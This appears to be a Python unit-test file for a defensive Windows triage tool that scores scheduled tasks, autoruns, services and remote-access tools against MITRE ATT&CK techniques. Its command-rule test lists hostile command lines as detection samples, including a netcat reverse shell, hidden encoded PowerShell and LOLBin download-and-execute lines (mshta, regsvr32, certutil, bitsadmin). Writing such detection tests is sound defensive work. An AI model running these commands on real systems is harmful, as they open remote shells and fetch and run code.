import unittest
import json
import os
import copy
from bluekit.resp.triage import (
    analyze, _norm_path_text, _norm_name, _is_clean_action, _suspicious_cmd
)

try:
    from bluekit.paths import get_kb_path
    from bluekit.kb.query import KB
    KB_AVAILABLE = os.path.exists(get_kb_path())
except ImportError:
    KB_AVAILABLE = False

FIXTURE_PATH = os.path.join(os.path.dirname(__file__), 'fixtures', 'real_win11_benign.json')

class TestTriageFP(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if os.path.exists(FIXTURE_PATH):
            with open(FIXTURE_PATH, 'r', encoding='utf-8') as f:
                cls.fx = json.load(f)
        else:
            cls.fx = {}
            
        cls.kb = KB() if KB_AVAILABLE else None

    def setUp(self):
        self.assertTrue(self.fx, "tests/fixtures/real_win11_benign.json topilmadi")

    def test_real_benign_no_high(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        findings, _ = analyze(self.kb, self.fx, None)
        highs = [f for f in findings if f['confidence'] == 'high']
        self.assertEqual(len(highs), 0)

    def test_real_benign_no_nonsense_techniques(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        findings, _ = analyze(self.kb, self.fx, None)
        bad_techs = {'T1003.001', 'T1136.001', 'T1685', 'T0843', 'T1204.002', 'T1059.003'}
        
        task_count = 0
        for f in findings:
            if f['category'] == 'tasks':
                task_count += 1
            for t in f['techniques']:
                self.assertNotIn(t['id'], bad_techs)
            for r in f['reasons']:
                self.assertNotIn("KB heuristika", r)
                
        self.assertLessEqual(task_count, 3)

    def test_real_benign_known_good_examples(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        names_to_check = ['Windows Defender Scheduled Scan', 'Windows Defender Cache Maintenance', 
                          'Recovery-Check', 'PCR Prediction Framework Firmware Update Task', 
                          'OneDrive', 'CiscoSpark', 'CiscoMeetingDaemon', 'Teams', 'Proton Drive', 
                          'WinDefend', 'WdNisSvc', 'MDCoreSvc']
        for kb_arg in [self.kb, None]:
            findings, _ = analyze(kb_arg, self.fx, None)
            for f in findings:
                if f['confidence'] in ('high', 'med'):
                    n = str(f['item'])
                    self.assertNotIn(n, names_to_check)
                    self.assertFalse(n.startswith('Firefox Background Update'))
                    self.assertFalse(n.startswith('OneDrive Startup Task'))

    def test_sample_highs_unchanged(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        sample_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'data', 'samples', 'resp', 'current_win.json')
        if not os.path.exists(sample_path):
            self.skipTest("sample missing")
        with open(sample_path, 'r', encoding='utf-8') as f:
            snap = json.load(f)
        findings, _ = analyze(self.kb, snap, None)
        highs = {(f['category'], f['item']) for f in findings if f['confidence'] == 'high'}
        expected = {
            ('connections', '45.142.212.61:443 (beacon.exe)'),
            ('tasks', 'Updater'),
            ('autoruns', 'Updater'),
            ('users', 'checker_admin'),
            ('users', 'admin'),
            ('hosts_file', '91.238.50.10 ibank.example.uz'),
            ('remote_access_tools', 'AnyDesk')
        }
        self.assertEqual(highs, expected)

    def test_masquerade_microsoft_task_path(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        fx2 = copy.deepcopy(self.fx)
        fx2.setdefault('tasks', []).append({
            'name': 'ScheduledDefrag', 
            'path': '\\Microsoft\\Windows\\Defrag\\', 
            'action': 'powershell.exe -nop -w hidden -enc SQBFAFgA', 
            'author': '', 
            'enabled': True
        })
        findings, _ = analyze(self.kb, fx2, None)
        found = False
        for f in findings:
            if f['category'] == 'tasks' and f['item'] == 'ScheduledDefrag':
                self.assertEqual(f['confidence'], 'high')
                self.assertTrue(any(t['id'] == 'T1059.001' for t in f['techniques']))
                found = True
        self.assertTrue(found)

    def test_masquerade_microsoft_task_rundll32_userdll(self):
        fx2 = copy.deepcopy(self.fx)
        fx2.setdefault('tasks', []).append({
            'name': 'SuspRundll', 
            'path': '\\Microsoft\\Windows\\X\\', 
            'action': '%windir%\\system32\\rundll32.exe C:\\ProgramData\\upd.dll,Start',
            'author': '', 
            'enabled': True
        })
        findings, _ = analyze(None, fx2, None)
        found = False
        for f in findings:
            if f['category'] == 'tasks' and f['item'] == 'SuspRundll':
                self.assertIn(f['confidence'], ('high', 'med'))
                self.assertTrue(any(t['id'] == 'T1218.011' for t in f['techniques']))
                found = True
        self.assertTrue(found)

    def test_masquerade_vendor_name_wrong_path(self):
        fx2 = copy.deepcopy(self.fx)
        fx2.setdefault('autoruns', []).append({
            'name': 'OneDrive', 
            'value': 'C:\\Users\\bob\\AppData\\Roaming\\OneDrive\\OneDrive.exe'
        })
        fx2.setdefault('tasks', []).append({
            'name': 'Firefox Background Update 1234ABCD5678', 
            'path': '\\Mozilla\\', 
            'action': 'C:\\Users\\Public\\firefox.exe',
            'author': '', 
            'enabled': True
        })
        findings, _ = analyze(None, fx2, None)
        od_found = False
        ff_found = False
        for f in findings:
            if f['category'] == 'autoruns' and f['item'] == 'OneDrive':
                self.assertTrue(any("shubhali papka" in r for r in f['reasons']))
                od_found = True
            if f['category'] == 'tasks' and f['item'] == 'Firefox Background Update 1234ABCD5678':
                ff_found = True
        self.assertTrue(od_found)
        self.assertTrue(ff_found)

    def test_real_rat_still_flagged(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        fx2 = copy.deepcopy(self.fx)
        fx2['remote_access_tools'] = [{'name': 'AnyDesk', 'evidence': 'process'}]
        fx2.setdefault('services', []).append({
            'name': 'AnyDesk', 
            'binary_path': '"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --service'
        })
        findings, _ = analyze(self.kb, fx2, None)
        rat = [f for f in findings if f['category'] == 'remote_access_tools' and f['item'] == 'AnyDesk']
        svc = [f for f in findings if f['category'] == 'services' and f['item'] == 'AnyDesk']
        self.assertTrue(len(rat) > 0)
        self.assertTrue(len(svc) > 0)
        self.assertEqual(rat[0]['confidence'], 'high')

    def test_suspicious_cmd_rules(self):
        cases = [
            ('C:\\Tools\\nc.exe -e cmd 1.2.3.4 443', True, None),
            ('nc -lvp 4444', True, None),
            ('SynchronizeTimeZone', False, None),
            ('%windir%\\system32\\dstokenclean.exe', False, None),
            ('OneDriveLauncher.exe /startInstances', False, None),
            ('%windir%\\system32\\rundll32.exe %windir%\\system32\\pcrpf.dll,NotifyFirmwareUpdateStaged', False, None),
            ('rundll32.exe Startupscan.dll,SusRunTask', False, None),
            ('"C:\\Program Files\\MuseHub\\current\\MuseHub.exe" "----ms-protocol:ms-encodedlaunch:App?ContractId=Windows.StartupTask"', False, None),
            ('powershell -ExecutionPolicy Bypass -File x.ps1', True, 'T1059.001'),
            ('mshta http://x/a.hta', True, 'T1218.005'),
            ('regsvr32 /s /i:http://x/a.sct scrobj.dll', True, 'T1218.010'),
            ('certutil -urlcache -f http://x/a a.exe', True, 'T1105'),
            ('certutil -decode a.b64 a.exe', True, 'T1140'),
            ('bitsadmin' + ' /transfer j http://x/a c:\\a.exe', True, 'T1197'),
            ('wscript.exe C:\\x\\a.vbs', True, 'T1059.005'),
            ('cscript a.js', True, 'T1059.007')
        ]
        for cmd, is_susp, expected_tech in cases:
            res = _suspicious_cmd(cmd)
            if is_susp:
                self.assertIsNotNone(res, f"Expected not None for {cmd}")
                if expected_tech:
                    self.assertEqual(res[0], expected_tech, f"Expected {expected_tech} for {cmd}")
            else:
                self.assertIsNone(res, f"Expected None for {cmd}")

    def test_builtin_techniques_active_in_kb(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        techs = ['T1059.001', 'T1218.005', 'T1218.010', 'T1218.011', 'T1105', 'T1140', 'T1197', 'T1059.005', 'T1059.007', 'T1685']
        res = self.kb.validate(techs)
        for r in res:
            self.assertEqual(r['status'], 'active', f"Tech {r.get('attack_id', r.get('id', 'unknown'))} is not active")

    def test_norm_name(self):
        cases = {
            'Firefox Background Update S-1-5-21-1-2-3-1001 308046B0AF4A39CB': 'firefox background update',
            'GoogleChromeAutoLaunch_5F84849B2B55F3FB722B227E29B35DDB': 'googlechromeautolaunch',
            'msedge_cleanup_{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}': 'msedge_cleanup',
            'OneDrive Startup Task-S-1-5-21-1-2-3-1001': 'onedrive startup task',
            'GoogleUpdateTaskMachineCore{A1B2C3D4-0000-1111-2222-333344445555}': 'googleupdatetaskmachinecore',
            'OfficeTelemetryAgentLogOn2016': 'officetelemetryagentlogon2016',
            'Updater': 'updater'
        }
        for k, v in cases.items():
            self.assertEqual(_norm_name(k), v)

    def test_norm_path_text(self):
        self.assertEqual(_norm_path_text(r'C:\Users\Bob\AppData\Local\Microsoft\OneDrive\x.exe'), r'c:\users\%user%\appdata\local\microsoft\onedrive\x.exe')
        self.assertEqual(_norm_path_text(r'%LOCALAPPDATA%\Microsoft\OneDrive\x.exe'), r'c:\users\%user%\appdata\local\microsoft\onedrive\x.exe')
        self.assertEqual(_norm_path_text(r'C:\Users\Public\x.exe'), r'c:\users\public\x.exe')

    def test_is_clean_action(self):
        SP = ['c:\\windows\\system32\\', 'c:\\windows\\syswow64\\', 'c:\\program files\\', 'c:\\program files (x86)\\', 'c:\\windows\\microsoft.net\\', 'c:\\programdata\\microsoft\\windows defender\\platform\\', 'c:\\programdata\\microsoft\\windows defender advanced threat protection\\']
        self.assertTrue(_is_clean_action(r'%windir%\system32\rundll32.exe %windir%\system32\pcrpf.dll,NotifyFirmwareUpdateStaged', SP, allow_bare_exe=True))
        self.assertTrue(_is_clean_action(r'%SystemRoot%\System32\dsregcmd.exe /checkrecovery', SP))
        self.assertTrue(_is_clean_action(r'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.4-0\MpCmdRun.exe Scan -ScheduleJob', SP))
        self.assertFalse(_is_clean_action('powershell.exe -w hidden -enc SQBF', SP))
        self.assertFalse(_is_clean_action(r'%windir%\system32\rundll32.exe C:\ProgramData\x.dll,Start', SP))
        self.assertFalse(_is_clean_action(r'C:\Users\Public\svc.exe', SP))
        self.assertFalse(_is_clean_action(r'C:\Program Files\Mozilla Firefox\firefox.exe --MOZ_LOG_FILE C:\ProgramData\Mozilla-1de4\updates\x.log', SP))
        self.assertTrue(_is_clean_action(r'C:\Program Files\Mozilla Firefox\firefox.exe --MOZ_LOG_FILE C:\ProgramData\Mozilla-1de4\updates\x.log', SP + ['c:\\programdata\\mozilla-']))
        self.assertTrue(_is_clean_action(r'"C:\Users\Bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background', SP + ['%localappdata%\\microsoft\\onedrive\\']))
        self.assertFalse(_is_clean_action(r'"C:\Users\Bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background', SP))

    def test_kb_medium_ignored(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        snap = {
            'meta': {'os': 'windows'},
            'autoruns': [{'name': 'ZZTest', 'value': 'C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveLauncher.exe /startInstances'}]
        }
        findings, _ = analyze(self.kb, snap, None)
        zz = [f for f in findings if f['category'] == 'autoruns' and f['item'] == 'ZZTest']
        self.assertEqual(len(zz), 1)  # noma'lum nom + AppData -> baribir topilma
        self.assertFalse(any(t['id'] == 'T1136.001' for t in zz[0]['techniques']))
        self.assertFalse(any("KB" in r for r in zz[0]['reasons']))

    def test_clean_action_script_host_unquoted(self):
        SP = ['c:\\windows\\system32\\', 'c:\\program files\\']
        # exe nomi oxirgi '\' komponentidan ('x.ps1') emas, birinchi .exe dan olinadi
        self.assertFalse(_is_clean_action(r'powershell.exe -file c:\windows\system32\x.ps1', SP, allow_bare_exe=True))
        self.assertFalse(_is_clean_action(r'c:\windows\system32\windowspowershell\v1.0\powershell.exe -file c:\windows\system32\x.ps1', SP))
        # URL-kodlangan %20 yechilmagan env o'zgaruvchi emas; %foo% esa shunday
        self.assertTrue(_is_clean_action(r'C:\Program Files\Proton\VPN\ProtonVPN.Launcher.exe "App?TaskId=Proton%20VPN"', SP))
        self.assertFalse(_is_clean_action(r'%foo%\x.exe', SP))

    def test_order_independence(self):
        if not KB_AVAILABLE: self.skipTest("KB required")
        fx2 = copy.deepcopy(self.fx)
        fx2['tasks'] = list(reversed(fx2.get('tasks', [])))
        fx2['autoruns'] = list(reversed(fx2.get('autoruns', [])))
        
        names_to_check = ['Windows Defender Scheduled Scan', 'Windows Defender Cache Maintenance', 
                          'Recovery-Check', 'PCR Prediction Framework Firmware Update Task', 
                          'OneDrive', 'CiscoSpark', 'CiscoMeetingDaemon', 'Teams', 'Proton Drive', 
                          'WinDefend', 'WdNisSvc', 'MDCoreSvc']
        findings, _ = analyze(self.kb, fx2, None)
        for f in findings:
            if f['confidence'] in ('high', 'med'):
                n = str(f['item'])
                self.assertNotIn(n, names_to_check)
                self.assertFalse(n.startswith('Firefox Background Update'))
                self.assertFalse(n.startswith('OneDrive Startup Task'))

if __name__ == '__main__':
    unittest.main()
